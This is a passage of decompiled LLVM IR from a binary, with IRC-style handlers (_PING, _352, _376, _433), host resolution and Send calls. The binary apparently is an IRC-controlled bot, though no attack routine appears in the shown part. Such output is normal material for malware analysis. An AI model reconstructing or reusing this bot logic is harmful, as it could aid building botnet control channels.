  store i32 %v3_96c0, i32* %r0.global-to-local, align 4
  %v2_96c8 = icmp eq i32 %v3_96c0, 0
  br i1 %v2_96c8, label %dec_label_pc_96d0, label %dec_label_pc_9a30

dec_label_pc_96d0:                                ; preds = %dec_label_pc_9694
  %v1_96dc = add i32 %v2_96a0.pre-phi, 1
  %v5_96e0 = inttoptr i32 %v1_96dc to i8*
  store i32 %v1_96dc, i32* %r0.global-to-local, align 4
  %v3_96e8 = call i32 @strlen(i8* %v5_96e0)
  store i32 %v3_96e8, i32* %r0.global-to-local, align 4
  %v2_9738 = add i32 %v16_94ec, -1092
  br label %dec_label_pc_9760

dec_label_pc_9700:                                ; preds = %dec_label_pc_9760
  %v2_9704 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 32
  br i1 %v7_9708, label %dec_label_pc_97b0, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %stack_var_-32.0, align 1
  %v2_9718 = icmp eq i8 %v2_9714, 0
  br i1 %v2_9718, label %dec_label_pc_97b0, label %dec_label_pc_9720

dec_label_pc_9720:                                ; preds = %dec_label_pc_9710
  %v2_9728 = load i8, i8* %stack_var_-32.0, align 1
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_973c = add i32 %v2_9738, %storemerge14
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 %v2_9728, i8* %v3_9744, align 1
  %v1_974c = add i32 %v4_9700, 1
  %v5_9750 = inttoptr i32 %v1_974c to i8*
  %v1_9758 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_9760

dec_label_pc_9760:                                ; preds = %dec_label_pc_96d0, %dec_label_pc_9720
  %stack_var_-32.0 = phi i8* [ %v5_96e0, %dec_label_pc_96d0 ], [ %v5_9750, %dec_label_pc_9720 ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_96d0 ], [ %v1_9758, %dec_label_pc_9720 ]
  %v5_976c = icmp slt i32 %storemerge14, %v3_96e8
  %v4_9700 = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v5_976c, label %dec_label_pc_9700, label %dec_label_pc_97b0

dec_label_pc_977c:                                ; preds = %dec_label_pc_97b0
  %v2_9788 = add i32 %storemerge15, %v4_9700
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 32
  br i1 %v7_9790, label %dec_label_pc_9798, label %dec_label_pc_97a4

dec_label_pc_9798:                                ; preds = %dec_label_pc_977c
  %v1_979c = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_977c, %dec_label_pc_9798
  %stack_var_-28.0 = phi i32 [ %v1_979c, %dec_label_pc_9798 ], [ %stack_var_-28.1, %dec_label_pc_977c ]
  %v1_97a8 = add i32 %storemerge15, 1
  br label %dec_label_pc_97b0

dec_label_pc_97b0:                                ; preds = %dec_label_pc_9700, %dec_label_pc_9710, %dec_label_pc_9760, %dec_label_pc_97a4
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_97a4 ], [ 0, %dec_label_pc_9760 ], [ 0, %dec_label_pc_9710 ], [ 0, %dec_label_pc_9700 ]
  %storemerge15 = phi i32 [ %v1_97a8, %dec_label_pc_97a4 ], [ 0, %dec_label_pc_9760 ], [ 0, %dec_label_pc_9710 ], [ 0, %dec_label_pc_9700 ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_9700, i32* %r0.global-to-local, align 4
  %v3_97b8 = call i32 @strlen(i8* %stack_var_-32.0)
  store i32 %v3_97b8, i32* %r0.global-to-local, align 4
  %v0_97c0 = load i32, i32* @r4, align 4
  %v3_97c0 = icmp ult i32 %v0_97c0, %v3_97b8
  br i1 %v3_97c0, label %dec_label_pc_977c, label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_97b0
  %v1_97cc = add i32 %stack_var_-28.1, 1
  %v7_97dc = icmp slt i32 %v1_97cc, 11
  br i1 %v7_97dc, label %dec_label_pc_97e8, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97c8
  br label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97c8, %dec_label_pc_97e0
  %stack_var_-28.2 = phi i32 [ %v1_97cc, %dec_label_pc_97c8 ], [ 10, %dec_label_pc_97e0 ]
  %tmp74 = mul i32 %stack_var_-28.2, 4
  %v3_9800 = add i32 %tmp74, 4
  %v2_9808 = add i32 %v16_94ec, -68
  %v2_980c = add i32 %v2_9808, %v3_9800
  %v2_9814 = inttoptr i32 %v2_980c to i32*
  store i32 ptrtoint (i32* @global_var_1c584.94 to i32), i32* %v2_9814, align 4
  %v2_993c19 = load i8, i8* %stack_var_-32.0, align 1
  %v2_994021 = icmp eq i8 %v2_993c19, 0
  br i1 %v2_994021, label %dec_label_pc_9948, label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %dec_label_pc_97e8, %dec_label_pc_988c
  %v4_993823 = phi i32 [ %v2_9930.pre-phi, %dec_label_pc_988c ], [ %v4_9700, %dec_label_pc_97e8 ]
  %stack_var_-24.022 = phi i32 [ %v1_991c, %dec_label_pc_988c ], [ 1, %dec_label_pc_97e8 ]
  %v1_9828 = add i32 %v4_993823, 1
  %v5_982c = inttoptr i32 %v1_9828 to i8*
  %v6_983c = icmp slt i32 %stack_var_-24.022, %stack_var_-28.2
  br i1 %v6_983c, label %dec_label_pc_9858, label %dec_label_pc_9948

dec_label_pc_984c:                                ; preds = %dec_label_pc_9870
  %v1_9850 = add i32 %storemerge17, 1
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %dec_label_pc_9824, %dec_label_pc_984c
  %storemerge17 = phi i32 [ %v1_9850, %dec_label_pc_984c ], [ 0, %dec_label_pc_9824 ]
  store i32 %v1_9828, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @strlen(i8* %v5_982c)
  store i32 %v3_9860, i32* %r0.global-to-local, align 4
  %v3_9868 = icmp ult i32 %storemerge17, %v3_9860
  br i1 %v3_9868, label %dec_label_pc_9870, label %dec_label_pc_9858.dec_label_pc_988c_crit_edge

dec_label_pc_9858.dec_label_pc_988c_crit_edge:    ; preds = %dec_label_pc_9858
  %.pre30 = add i32 %storemerge17, %v1_9828
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_988c

dec_label_pc_9870:                                ; preds = %dec_label_pc_9858
  %v2_987c = add i32 %storemerge17, %v1_9828
  %v1_9880 = inttoptr i32 %v2_987c to i8*
  %v2_9880 = load i8, i8* %v1_9880, align 1
  %v7_9884 = icmp eq i8 %v2_9880, 32
  br i1 %v7_9884, label %dec_label_pc_988c, label %dec_label_pc_984c

dec_label_pc_988c:                                ; preds = %dec_label_pc_9870, %dec_label_pc_9858.dec_label_pc_988c_crit_edge
  %v5_9934.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9858.dec_label_pc_988c_crit_edge ], [ %v1_9880, %dec_label_pc_9870 ]
  %v2_9930.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9858.dec_label_pc_988c_crit_edge ], [ %v2_987c, %dec_label_pc_9870 ]
  store i32 %stack_var_-24.022, i32* @r4, align 4
  %v1_9894 = add i32 %storemerge17, 1
  store i32 %v1_9894, i32* %r0.global-to-local, align 4
  %v1_989c = call i32 @malloc(i32 %v1_9894)
  %v0_98ac = load i32, i32* @r4, align 4
  %v3_98ac = mul i32 %v0_98ac, 4
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_98b8 = add i32 %v2_9808, %v3_98ac
  %v2_98bc = inttoptr i32 %v2_98b8 to i32*
  store i32 %v1_989c, i32* %v2_98bc, align 4
  %v3_98c8 = mul i32 %stack_var_-24.022, 4
  %v2_98d4 = add i32 %v2_9808, %v3_98c8
  %v1_98d8 = inttoptr i32 %v2_98d4 to i32*
  %v2_98d8 = load i32, i32* %v1_98d8, align 4
  store i32 %v2_98d8, i32* %r0.global-to-local, align 4
  store i32 %v1_9828, i32* @r1, align 4
  %v3_98e8 = call i32 @strncpy(i32 %v2_98d8, i32 %v1_9828, i32 %storemerge17)
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_9904 = load i32, i32* %v1_98d8, align 4
  %v2_990c = add i32 %v2_9904, %storemerge17
  %v3_9914 = inttoptr i32 %v2_990c to i8*
  store i8 0, i8* %v3_9914, align 1
  %v1_991c = add nuw i32 %stack_var_-24.022, 1
  %v2_993c = load i8, i8* %v5_9934.pre-phi, align 1
  %v2_9940 = icmp eq i8 %v2_993c, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_9824

dec_label_pc_9948:                                ; preds = %dec_label_pc_988c, %dec_label_pc_9824, %dec_label_pc_97e8
  %v7_9a24 = load i32, i32* bitcast ([5 x i8]** @global_var_26360.96 to i32*), align 4
  %v2_9a28 = icmp eq i32 %v7_9a24, 0
  br i1 %v2_9a28, label %dec_label_pc_9a30, label %dec_label_pc_9954

dec_label_pc_9954:                                ; preds = %dec_label_pc_9948
  store i32 %v7_9a24, i32* %r0.global-to-local, align 4
  %v2_9970 = inttoptr i32 %v7_9a24 to i8*
  %v3_9970 = call i32 @__GI_strcasecmp(i8* %v2_9970, i32 %v2_9620)
  store i32 %v3_9970, i32* %r0.global-to-local, align 4
  %v2_9998 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([5 x i8]** @global_var_26360.96 to i32), i32 4) to i32*), align 4
  store i32 %v2_9998, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 39360, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_9998)
  %v5_9a0865 = icmp sgt i32 %stack_var_-28.2, 1
  br i1 %v5_9a0865, label %dec_label_pc_99cc, label %dec_label_pc_9a30

dec_label_pc_99cc:                                ; preds = %dec_label_pc_9954, %dec_label_pc_99cc
  %storemerge1666 = phi i32 [ %v1_99f4, %dec_label_pc_99cc ], [ 1, %dec_label_pc_9954 ]
  %v3_99d4 = mul i32 %storemerge1666, 4
  %v2_99e0 = add i32 %v2_9808, %v3_99d4
  %v1_99e4 = inttoptr i32 %v2_99e0 to i32*
  %v2_99e4 = load i32, i32* %v1_99e4, align 4
  store i32 %v2_99e4, i32* @r0, align 4
  %v0_99ec = call i32 @free()
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge1666, 1
  %v5_9a08 = icmp slt i32 %v1_99f4, %stack_var_-28.2
  br i1 %v5_9a08, label %dec_label_pc_99cc, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9954, %dec_label_pc_99cc, %dec_label_pc_9948, %dec_label_pc_9694, %dec_label_pc_95fc, %dec_label_pc_95d4
  %v12_9a34 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_9a34

; uselistorder directives
  uselistorder i32 %v1_99f4, { 1, 0 }
  uselistorder i32 %v7_9a24, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_9828, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-24.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-28.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v4_9700, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %.pre27, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9640, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v4_9578, { 1, 0 }
  uselistorder i8* %v3_9568, { 1, 0 }
  uselistorder i8* %v3_953c, { 0, 2, 1 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i8* %v3_9520, { 1, 0 }
  uselistorder i32 %v16_94ec, { 2, 3, 0, 4, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-1124, { 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 24, 2, 1, 5, 3, 4, 6, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 20, 22, 21, 25, 23, 27, 26, 0 }
  uselistorder label %dec_label_pc_9a30, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_99cc, { 1, 0 }
  uselistorder label %dec_label_pc_9858, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97e8, { 1, 0 }
  uselistorder label %dec_label_pc_97b0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_97a4, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9660, { 1, 0 }
  uselistorder label %dec_label_pc_95a0, { 1, 0 }
  uselistorder label %dec_label_pc_951c, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39508, i32* %stack_var_-4, align 4
  %v2_9a50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a50, i32* @fp, align 4
  %v2_9a68 = load i32, i32* @global_var_2f538.92, align 4
  %v4_9a78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1c588.99 to i32), i32 %v2_9a68)
  %v2_9a80 = load i32, i32* @global_var_2f550.62, align 4
  %v4_9a94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1c598.104 to i32), i32 %v2_9a80)
  %v2_9a9c = load i32, i32* @global_var_2f538.92, align 4
  %v4_9aac = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1c5a8.106 to i32), i32 %v2_9a9c)
  ret i32 %v4_9aac

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39644, i32* %stack_var_-4, align 4
  %v2_9ad8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ad8, i32* @fp, align 4
  %v4_9af8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1c5b0.108 to i32), i32 %arg3)
  ret i32 %v4_9af8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39700, i32* %stack_var_-4, align 4
  %v2_9b10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b10, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9b58.preheader

dec_label_pc_9b40:                                ; preds = %dec_label_pc_9b70
  %v1_9b44 = add i32 %.pre, 1
  %v5_9b48 = inttoptr i32 %v1_9b44 to i8*
  %v1_9b50 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9b58

dec_label_pc_9b58:                                ; preds = %dec_label_pc_9b58.preheader, %dec_label_pc_9b40
  %stack_var_-36.0 = phi i32 [ %v1_9b50, %dec_label_pc_9b40 ], [ %stack_var_-36.118, %dec_label_pc_9b58.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_9b48, %dec_label_pc_9b40 ], [ %stack_var_-28.119, %dec_label_pc_9b58.preheader ]
  %v3_9b5c = load i8*, i8** %stack_var_-52, align 4
  %v3_9b60 = call i32 @strlen(i8* %v3_9b5c)
  %v3_9b68 = icmp ult i32 %stack_var_-36.0, %v3_9b60
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_9b68, label %dec_label_pc_9b70, label %dec_label_pc_9b80

dec_label_pc_9b70:                                ; preds = %dec_label_pc_9b58
  %v2_9b74 = load i8, i8* %stack_var_-28.0, align 1
  %v7_9b78 = icmp eq i8 %v2_9b74, 32
  br i1 %v7_9b78, label %dec_label_pc_9b80, label %dec_label_pc_9b40

dec_label_pc_9b80:                                ; preds = %dec_label_pc_9b58, %dec_label_pc_9b70
  %v1_9b84 = add i32 %.pre, 1
  %v3_9b90 = load i8*, i8** %stack_var_-52, align 4
  %v3_9b94 = call i32 @strlen(i8* %v3_9b90)
  %v9_9b9c = icmp eq i32 %stack_var_-36.0, %v3_9b94
  br i1 %v9_9b9c, label %dec_label_pc_9e20, label %dec_label_pc_9ba4

dec_label_pc_9ba4:                                ; preds = %dec_label_pc_9b80
  %v5_9b88 = inttoptr i32 %v1_9b84 to i8*
  %v1_9ba8 = add nuw nsw i32 %storemerge820, 1
  %v7_9bb8 = icmp slt i32 %v1_9ba8, 5
  br i1 %v7_9bb8, label %dec_label_pc_9b58.preheader, label %dec_label_pc_9bd4

dec_label_pc_9b58.preheader:                      ; preds = %entry, %dec_label_pc_9ba4
  %storemerge820 = phi i32 [ 0, %entry ], [ %v1_9ba8, %dec_label_pc_9ba4 ]
  %stack_var_-28.119 = phi i8* [ %arg3, %entry ], [ %v5_9b88, %dec_label_pc_9ba4 ]
  %stack_var_-36.118 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_9ba4 ]
  br label %dec_label_pc_9b58

dec_label_pc_9bc8:                                ; preds = %dec_label_pc_9bec
  %v1_9bcc = add i32 %storemerge9, 1
  br label %dec_label_pc_9bd4

dec_label_pc_9bd4:                                ; preds = %dec_label_pc_9ba4, %dec_label_pc_9bc8
  %storemerge9 = phi i32 [ %v1_9bcc, %dec_label_pc_9bc8 ], [ 0, %dec_label_pc_9ba4 ]
  store i32 %storemerge9, i32* @r4, align 4
  %v3_9bdc = call i32 @strlen(i8* %v5_9b88)
  %v0_9be4 = load i32, i32* @r4, align 4
  %v3_9be4 = icmp ult i32 %v0_9be4, %v3_9bdc
  br i1 %v3_9be4, label %dec_label_pc_9bec, label %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge

dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge:    ; preds = %dec_label_pc_9bd4
  %.pre26 = add i32 %storemerge9, %v1_9b84
  %.pre27 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_9c08

dec_label_pc_9bec:                                ; preds = %dec_label_pc_9bd4
  %v2_9bf8 = add i32 %storemerge9, %v1_9b84
  %v1_9bfc = inttoptr i32 %v2_9bf8 to i8*
  %v2_9bfc = load i8, i8* %v1_9bfc, align 1
  %v7_9c00 = icmp eq i8 %v2_9bfc, 32
  br i1 %v7_9c00, label %dec_label_pc_9c08, label %dec_label_pc_9bc8

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9bec, %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge
  %v3_9c1c.pre-phi = phi i8* [ %.pre27, %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge ], [ %v1_9bfc, %dec_label_pc_9bec ]
  store i8 0, i8* %v3_9c1c.pre-phi, align 1
  %v2_9c24 = load i32, i32* @global_var_2f538.92, align 4
  %v4_9c30 = call i32 @__GI_strcasecmp(i8* %v5_9b88, i32 %v2_9c24)
  %v2_9c38 = icmp eq i32 %v4_9c30, 0
  br i1 %v2_9c38, label %dec_label_pc_9c40, label %dec_label_pc_9e20

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9c08
  %v2_9c44 = load i32, i32* @global_var_2ac24.111, align 4
  %v2_9c48 = icmp eq i32 %v2_9c44, 0
  br i1 %v2_9c48, label %dec_label_pc_9c50, label %dec_label_pc_9e20

dec_label_pc_9c50:                                ; preds = %dec_label_pc_9c40
  %v3_9c50 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9c84.preheader

dec_label_pc_9c6c:                                ; preds = %dec_label_pc_9c9c
  %v1_9c70 = add i32 %.pre28, 1
  %v5_9c74 = inttoptr i32 %v1_9c70 to i8*
  %v1_9c7c = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_9c84

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9c84.preheader, %dec_label_pc_9c6c
  %stack_var_-36.2 = phi i32 [ %v1_9c7c, %dec_label_pc_9c6c ], [ %stack_var_-36.315, %dec_label_pc_9c84.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_9c74, %dec_label_pc_9c6c ], [ %stack_var_-28.316, %dec_label_pc_9c84.preheader ]
  %v3_9c88 = load i8*, i8** %stack_var_-52, align 4
  %v3_9c8c = call i32 @strlen(i8* %v3_9c88)
  %v3_9c94 = icmp ult i32 %stack_var_-36.2, %v3_9c8c
  %.pre28 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_9c94, label %dec_label_pc_9c9c, label %dec_label_pc_9cac

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9c84
  %v2_9ca0 = load i8, i8* %stack_var_-28.2, align 1
  %v7_9ca4 = icmp eq i8 %v2_9ca0, 32
  br i1 %v7_9ca4, label %dec_label_pc_9cac, label %dec_label_pc_9c6c

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c84, %dec_label_pc_9c9c
  %v1_9cb0 = add i32 %.pre28, 1
  %v3_9cbc = load i8*, i8** %stack_var_-52, align 4
  %v3_9cc0 = call i32 @strlen(i8* %v3_9cbc)
  %v9_9cc8 = icmp eq i32 %stack_var_-36.2, %v3_9cc0
  br i1 %v9_9cc8, label %dec_label_pc_9e20, label %dec_label_pc_9cd0

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9cac
  %v5_9cb4 = inttoptr i32 %v1_9cb0 to i8*
  %v1_9cd4 = add nuw nsw i32 %storemerge1017, 1
  %v7_9ce4 = icmp slt i32 %v1_9cd4, 3
  br i1 %v7_9ce4, label %dec_label_pc_9c84.preheader, label %dec_label_pc_9d00

dec_label_pc_9c84.preheader:                      ; preds = %dec_label_pc_9c50, %dec_label_pc_9cd0
  %storemerge1017 = phi i32 [ 0, %dec_label_pc_9c50 ], [ %v1_9cd4, %dec_label_pc_9cd0 ]
  %stack_var_-28.316 = phi i8* [ %v3_9c50, %dec_label_pc_9c50 ], [ %v5_9cb4, %dec_label_pc_9cd0 ]
  %stack_var_-36.315 = phi i32 [ 0, %dec_label_pc_9c50 ], [ %stack_var_-36.2, %dec_label_pc_9cd0 ]
  br label %dec_label_pc_9c84

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9d18
  %v1_9cf8 = add i32 %storemerge11, 1
  br label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cd0, %dec_label_pc_9cf4
  %storemerge11 = phi i32 [ %v1_9cf8, %dec_label_pc_9cf4 ], [ 0, %dec_label_pc_9cd0 ]
  store i32 %storemerge11, i32* @r4, align 4
  %v3_9d08 = call i32 @strlen(i8* %v5_9cb4)
  %v0_9d10 = load i32, i32* @r4, align 4
  %v3_9d10 = icmp ult i32 %v0_9d10, %v3_9d08
  br i1 %v3_9d10, label %dec_label_pc_9d18, label %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge

dec_label_pc_9d00.dec_label_pc_9d34_crit_edge:    ; preds = %dec_label_pc_9d00
  %.pre29 = add i32 %storemerge11, %v1_9cb0
  %.pre30 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_9d34

dec_label_pc_9d18:                                ; preds = %dec_label_pc_9d00
  %v2_9d24 = add i32 %storemerge11, %v1_9cb0
  %v1_9d28 = inttoptr i32 %v2_9d24 to i8*
  %v2_9d28 = load i8, i8* %v1_9d28, align 1
  %v7_9d2c = icmp eq i8 %v2_9d28, 32
  br i1 %v7_9d2c, label %dec_label_pc_9d34, label %dec_label_pc_9cf4

dec_label_pc_9d34:                                ; preds = %dec_label_pc_9d18, %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge
  %v3_9d48.pre-phi = phi i8* [ %.pre30, %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge ], [ %v1_9d28, %dec_label_pc_9d18 ]
  store i8 0, i8* %v3_9d48.pre-phi, align 1
  store i32 %v1_9cb0, i32* @r0, align 4
  %v2_9d50 = call i32 @inet_addr(i32 %v1_9cb0)
  %v5_9d58 = trunc i32 %v2_9d50 to i8
  store i8 %v5_9d58, i8* %stack_var_-40, align 1
  %v3_9d60 = icmp eq i8 %v5_9d58, -1
  br i1 %v3_9d60, label %dec_label_pc_9d68, label %dec_label_pc_9dc4

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9d34
  %v2_9d6c = call i32 @__GI_gethostbyname(i32 %v1_9cb0)
  %v2_9d7c = icmp eq i32 %v2_9d6c, 0
  br i1 %v2_9d7c, label %dec_label_pc_9d84, label %dec_label_pc_9da0

dec_label_pc_9d84:                                ; preds = %dec_label_pc_9d68
  %v2_9d88 = load i32, i32* @global_var_2f550.62, align 4
  %v4_9d98 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1c5bc.114 to i32), i32 %v2_9d88)
  br label %dec_label_pc_9e20

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9d68
  %v2_9da0 = ptrtoint i8* %stack_var_-40 to i32
  %v1_9da8 = add i32 %v2_9d6c, 16
  %v2_9da8 = inttoptr i32 %v1_9da8 to i32*
  %v3_9da8 = load i32, i32* %v2_9da8, align 4
  %v1_9dac = inttoptr i32 %v3_9da8 to i32*
  %v2_9dac = load i32, i32* %v1_9dac, align 4
  store i32 %v2_9dac, i32* @r1, align 4
  %v1_9db4 = add i32 %v2_9d6c, 12
  %v2_9db4 = inttoptr i32 %v1_9db4 to i32*
  %v3_9db4 = load i32, i32* %v2_9db4, align 4
  store i32 %v2_9da0, i32* @r0, align 4
  store i32 %v3_9db4, i32* @r2, align 4
  %v0_9dc0 = call i32 @memcpy()
  %v2_9dd0.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9d34, %dec_label_pc_9da0
  %v12_9e2425 = phi i32 [ %v0_9dc0, %dec_label_pc_9da0 ], [ %v2_9d50, %dec_label_pc_9d34 ]
  %v2_9dd0 = phi i8 [ %v2_9dd0.pre, %dec_label_pc_9da0 ], [ %v5_9d58, %dec_label_pc_9d34 ]
  store i8 %v2_9dd0, i8* bitcast (i8** @global_var_2ac23.117 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_2ac20.116 to i8*), align 4
  store i32 256, i32* @global_var_2ac24.111, align 4
  br label %dec_label_pc_9e20

dec_label_pc_9e20:                                ; preds = %dec_label_pc_9b80, %dec_label_pc_9cac, %dec_label_pc_9c40, %dec_label_pc_9c08, %dec_label_pc_9d84, %dec_label_pc_9dc4
  %v12_9e24 = phi i32 [ 0, %dec_label_pc_9c40 ], [ %v4_9c30, %dec_label_pc_9c08 ], [ %v4_9d98, %dec_label_pc_9d84 ], [ %v12_9e2425, %dec_label_pc_9dc4 ], [ %v3_9cc0, %dec_label_pc_9cac ], [ %v3_9b94, %dec_label_pc_9b80 ]
  ret i32 %v12_9e24

; uselistorder directives
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9cd4, { 1, 0 }
  uselistorder i32 %v1_9cb0, { 2, 4, 3, 0, 1, 5 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9ba8, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9e20, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9dc4, { 1, 0 }
  uselistorder label %dec_label_pc_9d00, { 1, 0 }
  uselistorder label %dec_label_pc_9c84.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9cac, { 1, 0 }
  uselistorder label %dec_label_pc_9bd4, { 1, 0 }
  uselistorder label %dec_label_pc_9b58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9b80, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40520, i32* %stack_var_-4, align 4
  %v2_9e44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9e44, i32* @fp, align 4
  %v2_9e5c = load i32, i32* @global_var_2f538.92, align 4
  store i32 %v2_9e5c, i32* @r0, align 4
  %v0_9e64 = call i32 @free()
  %v1_9e70 = call i32 @makestring(i32 %v0_9e64)
  %v2_9e7c = ptrtoint i32* %stack_var_-74 to i32
  %v3_9e88 = call i32 @strcpy(i32 %v2_9e7c, i8* bitcast (i32* @global_var_1c61c.122 to i8*))
  store i32 %v1_9e70, i32* @r1, align 4
  %v2_9e98 = bitcast i32* %stack_var_-74 to i8*
